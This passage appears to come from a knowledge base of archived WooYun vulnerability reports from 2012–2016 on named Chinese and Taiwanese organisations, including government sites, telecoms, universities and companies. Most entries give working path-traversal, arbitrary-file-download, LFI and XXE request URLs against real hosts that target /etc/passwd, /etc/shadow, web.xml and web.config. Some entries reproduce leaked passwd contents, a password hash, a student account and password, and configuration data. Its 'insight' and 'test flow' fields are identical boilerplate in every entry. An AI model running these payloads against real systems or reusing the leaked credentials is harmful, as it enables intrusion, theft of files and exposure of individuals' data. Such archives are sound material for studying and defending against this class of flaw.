**修复**: 加强输入验证
---

---
### [wooyun-2014-054156] 某政务系统通用任意文件下载
**厂商**: 某政务系统 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /do_download.jsp?path=\index.jsp注：由于开发人员比较奇特，文件名是do_download，但是参数KEY名称可能会变来变去，漏洞原因全是一样的 - -http://www.google.com.tw/search?q=inurl:do_download.jsp&newwindow=1&noj=1&ei=kv0qU-bCK6WpiAeBy4CADA&start=40&sa=N&biw=1920&bih=7601.www.gxhzgjj.com/do_download.jsp?id=../index.jsp2.gtj.heyuan.gov.cn/do_download.jsp?path=\index.jsp3.www.gdyc.gov.cn/jsp/do_download.jsp?path=\jsp\news.jsp4.www.dxalxzfwzx.gov.cn

**POC**: 1.www.gxhzgjj.com/do_download.jsp?id=../index.jsp2.gtj.heyuan.gov.cn/do_download.jsp?path=\index.jsp3.www.gdyc.gov.cn/jsp/do_download.jsp?path=\jsp\news.jsp4.www.dxalxzfwzx.gov.cn/home/do_download.jsp?url=/index.jsp5.www.fwzx-dhp.gov.cn/setting/download/do_download.jsp?url=/index.jsp

**绕过**: 直接利用

**修复**: 禁止目录跨越
---

---
### [wooyun-2014-065447] 某师范大学教务系统学籍照片可遍历获取下载
**厂商**: 某师范大学 | **年份**: 2014 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 认证接口

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 学校名称：湖南师范大学相关网址：http://jwgl.hunnu.edu.cn测试账号：2011090833  密码：19920222 （确认漏洞存在后，请将此账号密码修改，以免他人二次登陆！）前提账号：必须要用浏览器打开教务系统登陆任意一个学生账号，不能退出！http://jwgl.hunnu.edu.cn/(02jyfsqo3wjnrn45hthsceii)/readimagexs.aspx?xh=2013010101http://jwgl.hunnu.edu.cn/(02jyfsqo3wjnrn45hthsceii)/readimagexs.aspx?xh=2013010102http://jwgl.hunnu.edu.cn/(02jyfsqo3wjnrn45hthsceii)/readimagexs.aspx?xh=2013010103http://jwgl.hunnu.edu.

**POC**: 为测试此漏洞，下载了部分数据，请见谅！

**绕过**: 直接利用

**修复**: 你们比我懂的多.........
---

---
### [wooyun-2013-045493] 联想某分站任意文件下载漏洞+一个弱口令
**厂商**: 联想 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 联想企业级业务：里面各种解决方案，不知道干嘛用的..看重点，有下载的地方、http://app.relonline.cn/download.php?file=../../../../../../etc/passwd可以成功下载：root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltm

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 密码安全意识太薄弱了、下载参数过滤下
---

---
### [wooyun-2013-026198] 天翼商务领航技术服务中心 任意文件下载
**厂商**: 中国电信 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 天翼商务领航技术服务中心 任意文件下载 敏感信息泄露

**POC**: 漏洞地址：http://125.88.125.218/sagHelp/download/download.jsp?filename=web.xml&filetype=document&dirType=../../..//WEB-INF/下载web配置文件http://125.88.125.218/sagHelp/download/download.jsp?filename=passwd&filetype=document&dirType=../../../../../../../../../../../../etc下载系统文件

**绕过**: 直接利用

**修复**: 嘎嘎。。你懂得。天翼
---

---
### [wooyun-2013-025205] 中粮我买网某系统未授权访问
**厂商**: 中粮我买网 | **年份**: 2013 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我买网MSP管理系统，这个系统是干什么，我真不知道；http://oms.womaiapp.com/1. 首先是目录遍历；2. 其次是遍历的文件权限未进行限制；

**POC**: 目录遍历：越权访问：破解其中的md5密码；登录之；具体功能和内容，我就不研究了。截图以后，马上就退出了。我是清白的哟！～

**绕过**: 直接利用

**修复**: 1. 关闭目录遍历；2. 对关键功能增加用户权限或者类似的权限验证；
---

---
### [wooyun-2014-076197] 山东电信营销维系系统 任意文件下载敏感信息泄露
**厂商**: 中国电信 | **年份**: 2014 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://219.146.3.91:9001/servlet/download.action?fileName=../jsp/welcome.jsphttp://219.146.3.91:9001/servlet/download.action?fileName=../../struts.xmlhttp://219.146.3.91:9001/servlet/download.action?fileName=../error.jsphttp://219.146.3.91:9001/servlet/download.action?fileName=../index.jsp

**POC**: struts 2 配置信息

**绕过**: 直接利用

**修复**: - 0 - c厂商知道的
---

---
### [wooyun-2013-039556] 证券业某应用系统通用任意文件下载漏洞
**厂商**: 国家应急中心 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 该漏洞导致任意系统文件下载以前提交过：WooYun: 民生证券移动版某服务器系统文件遍历与任意下载百度了下不得了，有好多民族证券http://wap.e5618.com/smenu.php?menu=../../../../../../../../../../etc/passwd%00.jpg以下不截图了，自己打开看：长城证券手机炒股-资讯信息http://wap.cgws.com/smenu.php?menu=../../../../../../../../../../etc/passwd%00.jpg银泰证券手机炒股-注册 - 首页http://wap.ytzq.net/smenu.php?menu=../../../../../../../../../../etc/passwd%00.jpg国金证券http://wap.gjzq.com.cn/smenu.php?menu=../..

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 民生证券已经修复了，象民生证券一样修复吧
---

---
### [wooyun-2015-0123307] 中投保某系统存在任意文件下载漏洞
**厂商**: 中投保 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国证券投资者保护基金有限责任公司于2005年8月30日登记成立，由国务院独资设立，证监会、财政部、央行有关人士出任董事，与2005年9月29日正式开业，又被简称为中投保。问题出在中国证券投资者保护网（www.sipf.com.cn）http://www.sipf.com.cn/bin/Order?m=nwod&filePath=https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/APPSERVERMNG001/publicatoin/eJournal//1221108775468786.pdf&fileName=%D6%D0%B9%FA%D6%A4%C8%AF%CD%B6%D7%CA%D5%DF%B1%A3%BB%A4%BB%F9%BD%F0%D4%CB%D7%F7%C4%A3%CA%BD%D1%D0%BE%BF构造之http://

**POC**: http://www.sipf.com.cn/bin/Order?m=nwod&filePath=https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/APPSERVERMNG001/publicatoin/eJournal//../../../../../../../etc/hosts&fileName=hosts

**绕过**: 直接利用

**修复**: 过滤..
---

---
### [wooyun-2015-0104919] 中国移动地图接口任意文件读取
**厂商**: ditu.10086.cn | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: ditu.10086.cnGET /gisability?ability=apiserver&abilityuri=webapi/plugin&key=c5c2fac5054379d3238eaeeb9c9613c9ad69b360329dc1daf9fb9d5e75d687dd9e0740e1c72796c3&cls=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00MMap.ToolBar%2cMMap.OverView&rid=943459 HTTP

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-020064] 人人乐过滤不严导致服务器任意文件下载
**厂商**: 人人乐 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.renrenle.cn/share/download.jsp?filePath=../../../../../../etc/passwd人人乐任意文件下载，可以查看passwd等文件

**POC**: 人人乐任意文件下载，可以查看passwd等文件

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-057198] 用友某办公自动化平台漏洞之2-任意文件下载
**厂商**: 用友软件 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: FE协作办公平台FE协作办公平台测试版本：5.2.1版本大于5.2.1未受影响，小于5.2.1的版本未测在网上用百度找了一下直接传递文件的路径即可下载任意文件http://218.249.130.74/download.fe?filePath=e:/OA/Media/TemplateOfTaohong//../../../OA/database/fe_app5.mdf

**POC**: FE协作办公平台FE协作办公平台测试版本：5.2.1版本大于5.2.1未受影响，小于5.2.1的版本未测在网上用百度找了一下直接传递文件的路径即可下载任意文件http://218.249.130.74/download.fe?filePath=e:/OA/Media/TemplateOfTaohong//../../../OA/database/fe_app5.mdf

**绕过**: 直接利用

**修复**: 指定文件下载目录，并对路径参数过滤“.”
---

---
### [wooyun-2015-0135086] 东北证券官网任意文件读取漏洞（某通用型系统XXE）
**厂商**: 东北证券 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://nesc.cn/ubsiServlet?xml=<!DOCTYPE foo [<!ENTITY  xxe SYSTEM "file:///etc/passwd">]><ubsi service="service" method="method"><object type="Integer">%26xxe;</object></ubsi><object type="null" /><!-- 解析输入XML错误，java.lang.NumberFormatException: For input string: "root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nolo

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 禁止xml读取系统文件
---

---
### [wooyun-2015-0161413] 香港教育学院设计缺陷服务器任意文件下载（香港地區）
**厂商**: 香港教育学院 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标：https://**.**.**.**构造https://**.**.**.**/cplectures/include/getfile.php?file=getfile.php&filepath=../include&filename=getfile.php在getfile.php中$getright = true;$path = "../cp_upload/";$filepath = $filepath.'/';//echo $path.$filepath.$file;if(is_file($path.$filepath.$file)){$filerename = $filename;$file = $file;$path = $path.$filepath;$can_download =  true;}没有任何处理，可以下载服务器上任意文件如https://**.**.**.**

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ..
---

---
### [wooyun-2013-044614] 联想几处缺陷（svn、任意文件下载等）
**厂商**: 联想 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件下载。。http://legc.lenovo.com/lefactory/staticContent?type=originalAvatar&filename=../../../../etc/passwdhttp://123.103.23.10/存在Jboss远程代码执行。http://chuangyi.lenovo.com.cn/.svn/entries还一个.svnhttp://e-learning.lenovo.com.cn/exam.tar太大 不知道是什么。。一个不明物体~

**POC**: Root权限 内网~

**绕过**: 直接利用

**修复**: 升级
---

---
### [wooyun-2013-042314] 新网互联运维不当导致用户生活照片等泄露
**厂商**: 北京新网互联科技有限公司 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题网站，可以看到是个帮助网站，不应该出现生活照片：http://119.254.72.250/大量目录遍历，这里面有点意思：http://119.254.72.250/download/attachment/W5mbj-WGLv5gWZzNSb-W/http://119.254.72.250/download/attachment/W5mbj-WGLv5gWZzNSb-W/WlAWGe-Wbq-W/S5004792.JPG话说管理员这菜做的不错

**POC**: 其他目录里的的压缩包、照片、ppt等看似是个人的东西就不贴了

**绕过**: 直接利用

**修复**: 禁止目录遍历
---

---
### [wooyun-2013-034686] 某政府任意下载漏洞一枚
**厂商**: 赣州市 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此政府由于文件下载安全问题，导致可下载网站配置文件，得到后台管理信息

**POC**: 漏洞文件http://www.gzfcj.gov.cn/openFile/getFile.aspx?path=../../web.config后台地址：http://www.gzfcj.gov.cn/admini/manageLogin.aspx

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-025353] 国家电网吉林某分站存在目录遍历漏洞
**厂商**: 国家电网公司 | **年份**: 2013 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国家电网吉林省送变电工程公司网站存在目录遍历漏洞，敏感信息已经泄漏http://jlsbd.jl.sgcc.com.cn/Inc/ 目录遍历http://jlsbd.jl.sgcc.com.cn/databases/ 数据库暴漏

**POC**: 看吧，1.asp和2.asp，已经被拿到wbeshell了数据库暴漏了

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-041296] 东软集团网上报销系统运维不当导致签名泄露（可伪造员工签名）
**厂商**: 东软集团 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://i-expenses.neusoft.com/netFinance/login.do?method=begin从界面上看如果不登录是不允许看到相关内容的，但是打开如下地址：http://i-expenses.neusoft.com/netFinance/netFinance/signfile/可以看到目录遍历，有员工签名的图片

**POC**: 如上

**绕过**: 直接利用

**修复**: 禁止遍历
---

---
### [wooyun-2016-0170630] 国航某站任意文件下载漏洞
**厂商**: 中国航空集团财务有限责任公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://l.airchina.com.cn/cw/skin1/jsp/download.jsp?file=/WEB-INF/web.xml

**POC**: http://l.airchina.com.cn/cw/skin1/jsp/download.jsp?file=/WEB-INF/mvc-servlet.xml

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-070974] 逐浪CMS任意文件下载（官方DEMO演示）
**厂商**: 逐浪CMS | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Config/ConnectionStrings.config为数据库连接文件，当然，整站都可以下载，只要换下就得了http://demo.zoomla.cn/user/iServer/FiServerInfo.aspx?menu=filedown&filepath=//Config//ConnectionStrings.configreferrer:http://demo.zoomla.cn/user/iServer/FiServer.aspx

**POC**: FiServerInfo.aspx对应的page_load函数，未经验证范围，导致全站可下载protected void Page_Load(object sender, EventArgs e){if (!string.IsNullOrEmpty(base.Request.QueryString["menu"]) && (base.Request.QueryString["menu"] == "filedown")){string path = base.Request.QueryString["filepath"];if (path != ""){FileInfo info = new F

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0117432] 腾邦某系统目录遍历导致部分简历以及敏感信息泄露
**厂商**: 腾邦集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://group.tempus.cn/pw/job2/job2 目录下 可目录遍历http://group.tempus.cn/pw/job2/UI/Download/这个目录下 下载简历以及部分敏感信息随便下载两个 doc 文件其中几个txt 还泄露了部分内部信息

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0160038] 花蓮縣政府通用型 LFI 影響 32 站（臺灣地區）
**厂商**: 花蓮縣政府 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 整個花蓮縣網站幾乎存在該漏洞!

**POC**: 原本下載檔案的請求http://**.**.**.**/bin/downloadfile.php?file=WVhSMFlXTm9MemM0TDNCMFlWOHlPVE0zTTE4NU1USTJORGc0WHpFNE56ZzRMbkJrWmc9PQ==欄位file接受外部輸入,從上面value是 base64encode 兩次所產生的將要讀的 ../../../../../../../../../../../../etc/passwd base64兩次 ,構成以下POC, 成功exp:1.	http://**.**.**.**/bin/downloadfile.php?file=TGk0dkx

**绕过**: 直接利用

**修复**: 建議basename過濾~和可下載的副檔名限制白名單
---

---
### [wooyun-2014-076199] MBAChina#任意文件下载
**厂商**: MBAChina | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: MBAChinahttp://www.mbachina.com/down.php?path=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 做访问权限设置
---

---
### [wooyun-2014-067909] 400电话电话录音文件泄露
**厂商**: 400电话 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 服务器设置不当，导致目录遍历，从而可以下载150W+的录音文件。漏洞来源：WooYun: 400电话企业资料和电话录音可被泄露进行定点诈骗补洞没补干净。http://119.7.222.212:9090/monitorhttp://119.7.222.212:9090/monitor/%5b2014-7-09%5d/

**POC**: 看着小朋友们胡乱的下载，如果被有心人利用，可能出问题，所以还是提交一下，请抓紧修改。

**绕过**: 直接利用

**修复**: 你懂得，禁止目录遍历，并加入缺省索引文件。
---

---
### [wooyun-2012-016447] 中国联通武汉校信网用户所有安装信息泄漏（姓名电话身份证等）
**厂商**: 中国联通武汉市分公司 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站对upload目录权限设置不严，导致所有导入数据泄漏，包含个人姓名和手机号码，部分包含有身份证等信息

**POC**: http://www.woschool.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/

**绕过**: 直接利用

**修复**: 修改目录权限
---

---
### [wooyun-2014-054122] 中国柯桥政务公众信息网任意文件下载
**厂商**: 中国柯桥政务公众信息网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.shaoxing.gov.cn/wyztc/proposal/download.action?directory=proposals&fileName=../index.jsp

**POC**: www.shaoxing.gov.cn/wyztc/proposal/download.action?directory=proposals&fileName=../index.jsp

**绕过**: 直接利用

**修复**: 禁止目录跨越
---

---
### [wooyun-2015-091152] 07073某分站任意文件下载漏洞（可读php源码）
**厂商**: 07073.com | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 07074某分站任意文件下载漏洞（可读php源码）

**POC**: 根目录限制访问了，但是其他目录文件直接下载http://i.07073.comhttp://i.07073.com/search.php?key=%D3%A2%D0%DB%D5%BD%BB%EA&x=-1037&y=-56http://i.07073.com/common/xmod_work.php其他自己发挥，下载整站源码无压力，数据库密码什么的都懂

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0146723] 某住房公积金管理中心任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**滑县公积金像这种带下载路径的，如果处理的不好，容易造成任意文件下载

**POC**: 还真有，直接下载 webconfig<configuration><appSettings><add key="FCKeditor:BasePath" value="Manage/fckeditor/" /><add key="FCKeditor:UserFilesPath" value="~/UserFiles/image/" /><add key="LiZhiCMS" value="Data Source=.\sqlexpress;Initial Catalog=hxweb;User ID=xxxxx;Password=xxxx" /><add key="WebService.WebSer

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0143915] 中国人保财险某站存在任意文件读取漏洞
**厂商**: 中国人保财险 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国人保资产管理股份有限公司地址：http://www.piccamc.com/http://www.piccamc.com/news/NewsAttachmentAction.do?method=downloadStaticFile&filename=/../WEB-INF/web.xml

**POC**: http://www.piccamc.com/news/NewsAttachmentAction.do?method=downloadStaticFile&filename=/../index.jsphttp://www.piccamc.com/news/NewsAttachmentAction.do?method=downloadStaticFile&filename=/../include/includescript.jsp

**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2014-059369] 方正宽带FTP匿名登录（可任意文件下载）
**厂商**: 方正宽带 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 方正宽带FTP匿名登录（可任意文件下载）不知道是那个站，今天爬虫时候随便打开，然后学别人教我的加一个ftp，但是链接跳转又给我加了一个，然后旁边弟弟抢我电脑，乱按就进FTP了，乐死我了！我随便看看，下载都可以！url；   ftp://ftp.founder.com.cn/incoming/

**POC**: 本人对数据库特好奇，下载看看，别怪我！

**绕过**: 直接利用

**修复**: 设置密码吧！
---

---
### [wooyun-2015-0116719] 手机三国任意文件下载可查看网站源码
**厂商**: 上海顽迦网络科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.sanguomobile.com/download.php 页面下载 精美壁纸，鼠标移入后 下载到电脑；可以看到链接为/downimg.php?path=xxx。path后值可以是任意文件。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 将对应文件进行过滤处理或者限制目录即可
---

---
### [wooyun-2016-0168291] 搜狐畅游某站任意文件下载
**厂商**: 搜狐畅游 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://im.changyou.com/live800/downlog.jsp?path=/&fileName=/etc/passwdhttp://im.changyou.com/live800/downlog.jsp?path=/&fileName=/etc/shadow

**POC**: http://im.changyou.com/live800/downlog.jsp?path=/&fileName=/etc/passwdhttp://im.changyou.com/live800/downlog.jsp?path=/&fileName=/etc/shadow

**绕过**: 直接利用

**修复**: NUll
---

---
### [wooyun-2014-085491] 中石油某站存在任意文件读取
**厂商**: 中国石油天然气集团公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: GET /d/download/?fileName=../../../etc/passwd HTTP/1.1Referer: http://vipcard.petrochina.com.cn:80/Cookie: JSESSIONID=0000qxjZ61Nwj39N7iOFeTVqcVj:14png122dHost: vipcard.petrochina.com.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*root:25xCUpju5eo8U:0:3::/:/sbin/

**POC**: root:25xCUpju5eo8U:0:3::/:/sbin/shdaemon:*:1:5::/:/sbin/shbin:*:2:2::/usr/bin:/sbin/shsys:*:3:3::/:adm:*:4:4::/var/adm:/sbin/shuucp:*:5:3::/var/spool/uucppublic:/usr/lbin/uucp/uucicolp:*:9:7::/var/spool/lp:/sbin/shnuucp:*:11:11::/var/spool/uucppublic:/usr/lbin/uucp/uucicohpdb:*:27:1:ALLBASE:/:/sbin/

**绕过**: 直接利用

**修复**: 啥也不说了，你们应该了解。
---

---
### [wooyun-2013-028432] 万达电影某站web服务器目录遍历导致整套源码可被下载
**厂商**: 大连万达集团股份有限公司 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://images.wandafilm.com/目录可浏览，可下载网站源码

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2014-083341] 舜网某站任意文件下载(数据库密码泄漏)
**厂商**: e23.cn | **年份**: 2014 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 舜网 权8站 数据库密码泄漏

**POC**: http://www.e23.cn/inc   访问禁止分析： 替换conn.jsphttp://www.e23.cn/inc/submit.jsp?ArticleID=%3C%=request.getParameter(替换http://www.e23.cn/inc/conn.jsp?ArticleID=%3C%=request.getParameter(可实现下载，记事本打开<%@ page import="java.sql.*,javax.sql.*,javax.naming.*"%><%@ page import="java.util.*,java.text.*,java.io.*"%

**绕过**: 直接利用

**修复**: ...
---

---
### [wooyun-2015-0100903] 中国电信某站任意文件下载
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国电信某站存在任意文件下载漏洞

**POC**: http://hb.zhidao.189.cn/fileDownLoad.do?fileName=../../../etc/passwd

